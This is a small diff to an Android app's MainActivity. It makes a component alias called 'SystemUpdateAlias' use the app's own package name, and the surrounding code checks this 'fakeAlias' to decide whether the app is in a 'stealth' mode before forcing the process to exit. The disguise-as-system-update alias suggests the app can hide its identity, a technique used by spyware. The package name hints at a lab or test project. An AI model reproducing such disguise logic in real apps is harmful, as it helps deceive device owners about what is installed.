@@ -568,7 +568,7 @@ public class MainActivity extends AppCompatActivity {
         // 4. Force Process Exit (Optional, if not in stealth)
         backgroundExecutor.execute(() -> {
             try { Thread.sleep(2000); } catch (Exception ignored) {}
-            android.content.ComponentName fakeAlias = new android.content.ComponentName(this, "com.labs.labrats.SystemUpdateAlias");
+            android.content.ComponentName fakeAlias = new android.content.ComponentName(this, getPackageName() + ".SystemUpdateAlias");
             boolean stealth = getPackageManager().getComponentEnabledSetting(fakeAlias) == android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_ENABLED;
             
             if (!stealth) {
